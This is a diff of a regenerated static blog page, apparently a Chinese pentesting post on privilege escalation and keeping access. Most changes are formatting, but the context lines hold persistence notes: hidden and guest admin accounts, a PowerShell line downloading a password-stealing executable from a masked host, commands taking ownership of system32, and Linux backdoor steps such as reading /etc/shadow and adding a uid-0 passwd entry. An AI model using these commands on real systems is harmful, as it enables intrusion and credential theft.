@@ -2,7 +2,7 @@
 <html lang="en">
 
 <!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.8.0">
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,14 +25,20 @@
     <link rel="canonical" href="https://pengpengp.github.io/2019/03/03/提权/">
 
     <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
 
     <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
 
     <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
-</head>
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <style>
 
@@ -43,8 +49,8 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
-" data-ishome="false">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -119,7 +125,8 @@
 <!--only post-->
 
 
-<img class="wechat-title-img" src="">
+<img class="wechat-title-img"
+     src="">
 
 
 <style>
@@ -146,7 +153,8 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#内网/提权" title="内网/提权">内网/提权</a>
+                        <a class="tag" href="/tags/#内网/提权"
+                           title="内网/提权">内网/提权</a>
                         
                     </div>
                 </div>
@@ -210,12 +218,12 @@
 <hr>
 <h1 id="0x03维持权限-留后门"><a href="#0x03维持权限-留后门" class="headerlink" title="0x03维持权限(留后门)"></a>0x03维持权限(留后门)</h1><h2 id="一。windows留后门"><a href="#一。windows留后门" class="headerlink" title="一。windows留后门"></a>一。windows留后门</h2><ul>
 <li><p>1.添加隐藏账户</p>
-<p>可以完全隐藏—&gt;改注册表—&gt;<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/</a></p>
+<p>可以完全隐藏—&gt;改注册表—&gt;<a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/</a></p>
 </li>
 </ul>
 <ul>
 <li><p>2.启用来宾账户并添加为管理员</p>
-<p><code>注：从windows2008开始有来宾账户</code></p>
+<p><code>注：从windows2008开始有来宾账户 </code></p>
 </li>
 </ul>
 <ul>
@@ -248,27 +256,29 @@ cain:登陆目标机器导出注册表成文件，然后用cain加载获取hash
     优点：免杀
 powershell脚本获取密码：
     $client = new-object System.Net.WebClient;
-    $client.DownloadFile(&apos;http://*.*.*.*/a.exe&apos;,&apos;D:\GetPassword.exe&apos;);
-</code></pre><p>注：关闭windows系统保护的方法</p>
-<p><code>takeown /f c:\windows\system32\*.*   /a /r /d y</code><br>    <code>cacls  c:\windows\system32\*.*  /T /E /G administrators:F</code></p>
+    $client.DownloadFile(&#39;http://*.*.*.*/a.exe&#39;,&#39;D:\GetPassword.exe&#39;);</code></pre>
+<p>注：关闭windows系统保护的方法</p>
+<p><code>takeown /f c:\windows\system32\*.*   /a /r /d y </code><br>    <code>cacls  c:\windows\system32\*.*  /T /E /G administrators:F</code></p>
 <h2 id="二。linux留后门-获取root密码："><a href="#二。linux留后门-获取root密码：" class="headerlink" title="二。linux留后门+获取root密码："></a>二。linux留后门+获取root密码：</h2><pre><code>获取密码：读/etc/shadow文件破解
 加ssh公钥
 加用户
 计划任务
-参考脏牛(修改passwd文件添加&quot;user:password:0:0&quot;)
-</code></pre>
+参考脏牛(修改passwd文件添加&quot;user:password:0:0&quot;)</code></pre>
+
                 <hr>
                 
 
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/03/10/内网穿透工具/" data-toggle="tooltip" data-placement="top" title="内网穿透工具">&larr; Previous Post</a>
+                        <a href="/2019/03/10/内网穿透工具/" data-toggle="tooltip" data-placement="top"
+                           title="内网穿透工具">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2019/03/03/grep-find-awk-sed指令基础/" data-toggle="tooltip" data-placement="top" title="grep.find.awk.sed指令基础">Next Post &rarr;</a>
+                        <a href="/2019/03/03/grep-find-awk-sed指令基础/" data-toggle="tooltip" data-placement="top"
+                           title="grep.find.awk.sed指令基础">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -287,7 +297,7 @@ powershell脚本获取密码：
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00本地服务提权"><span class="toc-text">0x00本地服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux"><span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01数据库提权"><span class="toc-text">0x01数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis未授权"><span class="toc-text">redis未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql直接执行命令"><span class="toc-text">mssql直接执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02第三方软件提权："><span class="toc-text">0x02第三方软件提权：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03维持权限-留后门"><span class="toc-text">0x03维持权限(留后门)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一。windows留后门"><span class="toc-text">一。windows留后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二。linux留后门-获取root密码："><span class="toc-text">二。linux留后门+获取root密码：</span></a></li></ol></li>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-text">0x00本地服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux"><span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-text">0x01数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">redis未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">mssql直接执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-text">0x02第三方软件提权：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90-%E7%95%99%E5%90%8E%E9%97%A8"><span class="toc-text">0x03维持权限(留后门)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%82windows%E7%95%99%E5%90%8E%E9%97%A8"><span class="toc-text">一。windows留后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%82linux%E7%95%99%E5%90%8E%E9%97%A8-%E8%8E%B7%E5%8F%96root%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-text">二。linux留后门+获取root密码：</span></a></li></ol></li></ol>
                 </div>
             </div>
         </div>
@@ -339,11 +349,11 @@ powershell脚本获取密码：
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    Copyright &copy; pengpengp&#39;s BLOG 2020
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
                 </p>
 
             </div>
@@ -352,13 +362,19 @@ powershell脚本获取密码：
 </footer>
 
 <!-- jQuery -->
+
 <script src="/js/jquery.min.js"></script>
 
+
 <!-- Bootstrap Core JavaScript -->
+
 <script src="/js/bootstrap.min.js"></script>
 
+
 <!-- Custom Theme JavaScript -->
+
 <script src="/js/blog.js"></script>
+
 
 <!-- async load function -->
 <script>
